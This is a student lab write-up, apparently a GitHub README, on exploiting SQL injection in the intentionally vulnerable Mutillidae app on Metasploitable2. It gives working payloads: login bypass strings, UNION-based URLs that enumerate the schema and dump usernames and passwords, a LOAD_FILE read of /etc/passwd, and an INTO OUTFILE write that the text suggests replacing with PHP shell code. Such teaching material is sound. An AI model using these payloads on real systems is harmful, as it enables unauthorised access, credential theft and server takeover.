# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

# ![Screenshot 2024-04-20 210757](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/5aec25a3-1c85-45a3-a30a-94320cc13da4)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

# ![Screenshot 2024-04-20 210851](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/dee4a2e0-45b8-4396-afd6-80f649357950)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:


# ![Screenshot 2024-04-20 210953](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/f5c66272-91ee-4d56-aa50-cfa307373dee)
Click on the menu Login/Register and register for an account

# ![Screenshot 2024-04-20 211337](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/94bc4056-a2b3-4695-8843-196e4cb4fd92)
Click on the link “Please register here”

# ![Screenshot 2024-04-20 211424](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/a829aa7f-a24b-4804-bd4d-959a6b2a70c2)
Click on “Create Account” to display the following page:

# ![Screenshot 2024-04-20 211533](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/22e2782f-cd01-4532-91fc-79a45ffdebf0)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

# ![Screenshot 2024-04-20 211638](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/2ca45dfc-bd6d-4808-8404-13e8f4d9481f)

Click “Login”. The logged in page will show as below:
# ![Screenshot 2024-04-20 211739](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/227daa8b-1112-4bd1-b848-efc78b8913fa)
## Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

# ![Screenshot 2024-04-20 211830](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/372eaa56-84ce-4677-ba67-710b52a78979)
Click the login button and you will see it enter into the administrator page.

# ![Screenshot 2024-04-20 211911](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/144bf1c8-085b-46ca-b62e-6ead820ec65a)
## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below:

# ![Screenshot 2024-04-20 212006](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/49481ee8-ce96-4b6c-9d09-16cb1d8bbfc5)
# ![Screenshot 2024-04-20 212031](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/c3d5c80f-0ce4-429a-aa98-d5502e04e252)
# ![Screenshot 2024-04-20 212053](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/893f4a57-3c69-49e9-a6a6-2380099070ed)
# ![Screenshot 2024-04-20 212208](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/04390e6d-dc89-4f02-a6d2-bd46780ca46d)
# ![Screenshot 2024-04-20 212256](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/f3be92cc-223f-442a-bd13-adc98754488f)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

# ![Screenshot 2024-04-20 212353](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/e8925bd2-6e01-4230-a51a-69b4f2fb92cf)
ince we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

# ![Screenshot 2024-04-20 212458](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/cac93442-4935-427b-a416-a03ded50f1b0)
After adding the order by 6 into the existing url , the following error statement will be obtained:

# ![Screenshot 2024-04-20 212602](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/e0c260a9-9422-4691-9df3-c94b7948d8a5)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

# ![Screenshot 2024-04-20 212704](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/f62d7477-7d01-42f7-93d5-e220c4d9143b)
As it is having 5 columns the query worked fine and it provides the correct result

# ![Screenshot 2024-04-20 212744](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/cf0c04ce-4587-468b-b0d4-c5b87fb28bce)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

# ![Screenshot 2024-04-20 212836](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/49d2eb18-0eb1-477c-bbb0-9e4cad0747c3)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information. 

# ![Screenshot 2024-04-20 212914](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/8ab7904a-d23d-424e-80a1-447cc91759c0)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details


# ![Screenshot 2024-04-20 213007](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/4ff82f60-19d5-46ff-a622-5c9b95326f13)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

# ![Screenshot 2024-04-20 213140](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/1fb019a5-bbdd-4f02-8c3d-4545c9ecbee7)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

# ![Screenshot 2024-04-20 213313](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/88e96a8f-dd36-498f-88b6-a1c302e605f1)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

# ![Screenshot 2024-04-20 213435](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/0816289b-d663-4215-907c-a10785f42851)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

# ![Screenshot 2024-04-20 213547](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/17e62ae5-c8ec-48d6-9992-d2ebf7522300)
## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

# ![Screenshot 2024-04-20 213648](https://github.com/DEEPAK22003907/sqlinjection/assets/119404520/6f0164d2-4a15-43f5-b624-fe46556b6fb7)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
